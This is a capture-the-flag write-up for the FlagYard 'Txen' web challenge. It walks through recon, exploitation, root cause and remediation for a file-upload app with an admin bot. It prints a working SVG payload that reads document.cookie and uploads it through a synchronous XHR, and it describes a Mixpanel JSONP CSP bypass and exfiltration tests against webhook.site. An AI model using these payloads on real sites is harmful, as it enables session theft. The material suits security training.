# 📤 Txen — FlagYard Training Labs (Medium Web)

> **Platform:** FlagYard Training Labs
> **Challenge:** Txen — "Txen App" (a file-sharing service with an admin bot)
> **Author:** SAFCSP · **Category:** Web · **Difficulty:** Medium
> **Target Instance:** `http://k725e76b27717474b73976e5483536571.playat.flagyard.com`
> **Final Flag:** `FlagY{acfc0e3c47b8975f006174cd5b1da1b4}`
> **Solved by:** Fares Badaj (@ptok3)

---

## 📌 Overview

**Txen** is a Next.js based file-sharing service: anyone can upload a file, get a link, and "report" a URL that an **admin bot** will visit. The bot holds the flag in a cookie (`FLAG=FlagY{...}`). The game is simple: get the bot to run our JavaScript *same-origin* and walk the cookie out of the browser.

| Endpoint | Method | Notes |
|---|---|---|
| `/` | GET | Landing page ("Txen Upload File Upload Report") |
| `/api/upload` | POST | multipart `file`; **extension-only** check (`.svg` accepts any bytes) |
| `/uploads/<name>` | GET | Serves the file **only when `Sec-Fetch-*` headers present**, else `307 → /403` |
| `/report` | GET | Form for reporting URLs |
| `/api/report` | POST | `{"url":"..."}` → admin bot visits; **only `localhost` allowed** |

The classic public write-ups for Txen use the **Mixpanel JSONP callback** trick (the original CSP was `script-src 'self' *.facebook.com *.mixpanel.com platform.twitter.com syndication.twitter.com`, so `callback=(()=>{...})` on `api.mixpanel.com/track` gives you a script gadgets that can execute arbitrary JS) and exfiltrate `document.cookie` to an external receiver server.

> **💡 Instance-specific twist:** on this FlagYard instance the uploaded files are served with **no CSP at all**, but the bot’s container has **no outbound internet** — any external request triggered by the page (plain `<image src=/>`, `fetch()` to a remote host, Mixpanel JSONP, anything) makes the report job crash → `/api/report` answers `500 {"message":"Internal server error"}`, and nothing ever reaches an external receiver. So instead of exfiltrating *out*, we make the bot exfiltrate the cookie **back through the app itself**.

---

## 🔍 1) Recon

### Upload accepts anything with a nice extension

`POST /api/upload` (multipart, field `file`): only the **filename suffix** is validated — `.svg` with *any* body and *any* content-type uploads fine; `.txt` is rejected even with an image content-type:

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Bnd6712062782

------Bnd6712062782
Content-Disposition: form-data; name="file"; filename="x.svg"
Content-Type: image/svg+xml

<svg ...>...</svg>
------Bnd6712062782--
```

→ `200 {"message":"File uploaded successfully","filePath":"public/uploads/e5a48f95eb804b63c133f4500.svg"}`

### The /403 onion on `/uploads`

`GET /uploads/<name>` without browser “fetch metadata” headers → `307` redirect to `/403`:

```text
GET /uploads/e5a48f95eb804b63c133f4500.svg          → 307 /403
GET /uploads/e5a48f95eb804b63c133f4500.svg
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin                        → 200 <raw SVG>
```

A real headless bot sends `Sec-Fetch-*`, so whatever *it* requests loads fine — we just need to replay the headers when we read files ourselves.

### `/api/report` is localhost-only

```http
POST /api/report
{"url":"http://localhost:5000/uploads/e5a48f95eb804b63c133f4500.svg"}
→ 200 {"message":"URL submitted successfully"}

{"url":"http://127.0.0.1:5000/..."}        → Only localhost URLs are allowed
{"url":"https://k725e76b27...flagyard.com"} → Only localhost URLs are allowed
```

So the bot navigates `http://localhost:5000/uploads/<our-file>.svg` — **the SVG becomes same-origin with the app** → `document.cookie` is readable. The file name difference is: the access path is `/uploads/<name>` (the `/public` prefix from `filePath` is dropped).

### The bot has no internet

Controlled experiments (all with a webhook.site listener `00f85b1f-...` set up):

| Visited page action | `/api/report` result | webhook hits |
|---|---|---|
| harmless `<text>` SVG | `200 URL submitted successfully` | 0 |
| `<image href="https://webhook.site/...">` | `500 Internal server error` | 0 |
| `fetch("https://webhook.site/...")` / Mixpanel JSONP script | `500 Internal server error` | 0 |
| `new Image().src='https://...'` | `500 Internal server error` | 0 |

Conclusion: **external network = crash**. Exfil must be in-app.

---

## 🎯 2) Exploitation — cookie exfil through the app

### Step 1 — Craft the cookie-stealing SVG

Since there is no CSP on served files, we use a plain inline `<script>` (no `foreignObject` needed) that **synchronously** POSTs `document.cookie` back to `/api/upload` as a new file:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>
var d=document.cookie;
var fd=new FormData();
fd.append('file',new Blob([d],{type:'image/svg+xml'}),'steal.svg');
var x=new XMLHttpRequest();
x.open('POST','/api/upload',false);
x.send(fd);
</script>
</svg>
```

> ⚠️ **Why synchronous XHR?** The bot tears the page down after the visit; an *async* `fetch()`/XHR gets aborted before the request is flushed. A synchronous XHR blocks the script until the upload completes — that is what reliably lands a file (verified: async `fetch` built a file sometimes, sync XHR was deterministic).

### Step 2 — Upload it and report the localhost URL

```text
POST /api/upload          → public/uploads/e5a48f95eb804b63c133f4516.svg
POST /api/report
     {"url":"http://localhost:5000/uploads/e5a48f95eb804b63c133f4516.svg"}
     → 200 URL submitted successfully
```

The stored file **is our bytes**, so the bot’s rendered page is 100% attacker-controlled JS running on the app’s origin.

### Step 3 — Predict the name of the bot's upload

Upload file names look like:

```text
e5a48f95eb804b63c133f4 + 500, 501, ... 509, 50a, 50b, ... 50f, 510, 511 ...
```

There is a **global, hexadecimal, monotonically increasing counter**: every accepted upload (ours or the bot’s) bumps it by 1. Crucially, the *whole* file name (minus extension) is a hex integer, and consecutive uploads differ by exactly `+1`. So if our payload was at `...f4516`, the bot’s cookie file is very likely exactly `...f4517` (the very next upload):

```text
GET /uploads/e5a48f95eb804b63c133f4517.svg  (with Sec-Fetch headers)
→ 200  "FLAG=FlagY{acfc0e3c47b8975f006174cd5b1da1b4}"
```

**🏁 FLAG RECOVERED:** `FlagY{acfc0e3c47b8975f006174cd5b1da1b4}`

The full automation is in [`solve_txen.py`](./solve_txen.py) (single command → live bot trigger + predictable-name scan → `flag_from_txen.txt`).

---

## 🔬 3) Root Cause Analysis

1. **Uploaded content is served as attacker-controlled `image/svg+xml` on the same origin** — no CSP, no sandbox. An SVG is a document: `<script>` inside it executes when the bot opens it, with full access to the app origin (hence `document.cookie`).
2. **No ownership on `/api/upload`** — unauthenticated, and *anyone* (including JavaScript running in the bot) can store arbitrary bytes; the server happily stores whatever the XMLHttpRequest copies in.
3. **Predictable file naming** — a global incrementing hex counter means the attacker can enumerate every file, including the one the bot just uploaded.
4. **The report bot gives a same-origin navigation primitive** — reporting an upload URL turns our file into the “top-level page” of the trusted origin.

---

## 🛠️ 4) Remediation

* Serve user uploads from **their own origin / hostname** (e.g. `uploads.example`) with `Content-Security-Policy: sandbox; default-src 'none'` and `X-Content-Type-Options: nosniff`; never serve attacker `text/script`-capable content on the trusted origin.
* **Strictly whitelist SVG** (rasterize server-side / allow only `<svg>` without `<script>`, `<foreignObject>`, `<image>`, external refs), or serve as `text/plain`/`application/octet-stream` with `Content-Disposition: attachment`.
* **Unpredictable file names** (cryptographic random 128-bit) so uploads can’t be enumerated; keep counters out of the name.
* Harden `/api/upload`: require authentication, reject duplicated/oversized bodies, and quarantine bot-visited URL hosts (no *external* network from the bot container — here it was already the *only* thing keeping us out).

---

## 💡 5) Practical Takeaways

* **No CSP ≠ the only path.** The famous Mixpanel JSONP bypass assumes the bot can reach the internet; when it can’t, flip the data flow *inward* — use the app’s own storage endpoints as your exfiltration channel and read them back with your own session.
* **Predictable names are a public read primitive.** A monotonic counter + multipart upload = anyone can leak files, including ones the *admin bot* wrote.
* **Synchronous XHR beats async in headless bots.** The bot tears pages down; blocking requests keep working, async ones get cancelled.
* **`/uploads` behind `Sec-Fetch-Dest`** is a nice anti-CSRF-ish gate for plain browsers but means nothing against a real headless client (it sends the headers) — and it’s trivially replayable in requests.

---

## 👑 Credits

Made with ❤ by **Fares Badaj** — Red Team Operator | Penetration Tester Specialist

- Telegram: [@ptok3](https://t.me/ptok3)
- GitHub: [github.com/FaresBadaj](https://github.com/FaresBadaj)
- LinkedIn: [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj)
- Credly: [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

*Technique reference: m7eesn — "[Writeup] Txen (WEB, Medium)" (upload SVG → report to admin bot → Mixpanel JSONP CSP gadget → cookie exfil). Adapted here: externals were blocked on the live instance, so the cookie is exfiltrated in-app via `/api/upload` and read through the predictable hex file-name counter.*